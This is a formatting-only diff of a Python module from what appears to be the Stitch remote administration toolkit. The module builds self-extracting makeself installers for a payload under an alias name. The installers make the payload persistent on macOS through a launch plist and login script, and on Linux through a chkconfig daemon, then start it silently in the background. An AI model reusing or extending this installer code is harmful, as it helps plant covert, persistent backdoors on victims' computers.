@@ -8,12 +8,13 @@ import subprocess
 from globals import *
 from payload_setup import *
 
-mkself_path = os.path.join(tools_path,'makeself')
-mkself_exe = os.path.join(mkself_path,'makeself.sh')
+mkself_path = os.path.join(tools_path, 'makeself')
+mkself_exe = os.path.join(mkself_path, 'makeself.sh')
+
 
 def run_command(command):
     try:
-        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        subp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         subp_output, errors = subp.communicate()
         if not errors:
             if subp_output == '':
@@ -24,14 +25,16 @@ def run_command(command):
     except KeyboardInterrupt:
         print "Terminated command."
 
+
 def no_error(cmd_output):
     if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
         return False
     else:
         return True
 
-#TODO write cross platform install commands
-def gen_st_setup(alias,mkself_tmp):
+
+# TODO write cross platform install commands
+def gen_st_setup(alias, mkself_tmp):
     setup_code = '''#!/bin/bash
 
 osx=false
@@ -112,13 +115,14 @@ nohup /usr/local/sbin/{0}.app/Contents/MacOS/{0} >> /dev/null 2>&1 &
 '''.format(alias)
 
     st_setup = os.path.join(mkself_tmp, 'st_setup.sh')
-    with open(st_setup,'w') as s:
+    with open(st_setup, 'w') as s:
         s.write(setup_code)
     st_onlogin = os.path.join(mkself_tmp, 'onlogin.sh')
-    with open(st_onlogin,'w') as s:
+    with open(st_onlogin, 'w') as s:
         s.write(onlogin_code)
 
-def gen_osx_plist(alias,mkself_tmp):
+
+def gen_osx_plist(alias, mkself_tmp):
     plist_code = '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -159,7 +163,8 @@ def gen_osx_plist(alias,mkself_tmp):
     with open(st_plist, 'w') as s:
         s.write(plist_code)
 
-def gen_lnx_daemon(alias,mkself_tmp):
+
+def gen_lnx_daemon(alias, mkself_tmp):
     su_daemon_code = '''#!/bin/bash
 # chkconfig: 2345 80 20
 
@@ -193,31 +198,35 @@ exit 0
         s.write(su_daemon_code)
 
 
-def gen_makeself(conf_dir,alias):
-    mkself_tmp = os.path.join(conf_dir,'tmp')
-    conf_mkself = os.path.join(conf_dir,'Installers')
+def gen_makeself(conf_dir, alias):
+    mkself_tmp = os.path.join(conf_dir, 'tmp')
+    conf_mkself = os.path.join(conf_dir, 'Installers')
     if not os.path.exists(conf_mkself):
         os.makedirs(conf_mkself)
     if not os.path.exists(mkself_tmp):
         os.makedirs(mkself_tmp)
     if sys.platform.startswith('darwin'):
-        alias_app = os.path.join(conf_dir,'{}.app'.format(alias))
+        alias_app = os.path.join(conf_dir, '{}.app'.format(alias))
         if os.path.exists(alias_app):
-            run_command('cp -R {} {}'.format(alias_app,mkself_tmp))
-            gen_osx_plist(alias,mkself_tmp)
-            gen_st_setup(alias,mkself_tmp)
-            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe, mkself_tmp, conf_mkself,alias)
+            run_command('cp -R {} {}'.format(alias_app, mkself_tmp))
+            gen_osx_plist(alias, mkself_tmp)
+            gen_st_setup(alias, mkself_tmp)
+            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe,
+                                                                                                   mkself_tmp,
+                                                                                                   conf_mkself, alias)
             st_log.info(mkself_installer)
             st_log.info(run_command(mkself_installer))
             shutil.rmtree(mkself_tmp)
     else:
-        binry_dir = os.path.join(conf_dir,'Binaries')
+        binry_dir = os.path.join(conf_dir, 'Binaries')
         alias_dir = os.path.join(binry_dir, alias)
         if os.path.exists(alias_dir):
-            run_command('cp -R {} {}'.format(alias_dir,mkself_tmp))
-            gen_lnx_daemon(alias,mkself_tmp)
-            gen_st_setup(alias,mkself_tmp)
-            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe, mkself_tmp, conf_mkself,alias)
+            run_command('cp -R {} {}'.format(alias_dir, mkself_tmp))
+            gen_lnx_daemon(alias, mkself_tmp)
+            gen_st_setup(alias, mkself_tmp)
+            mkself_installer = 'bash "{}" "{}" "{}/{}_Installer" "Stitch" bash st_setup.sh'.format(mkself_exe,
+                                                                                                   mkself_tmp,
+                                                                                                   conf_mkself, alias)
             st_log.info(mkself_installer)
             st_log.info(run_command(mkself_installer))
             shutil.rmtree(mkself_tmp)
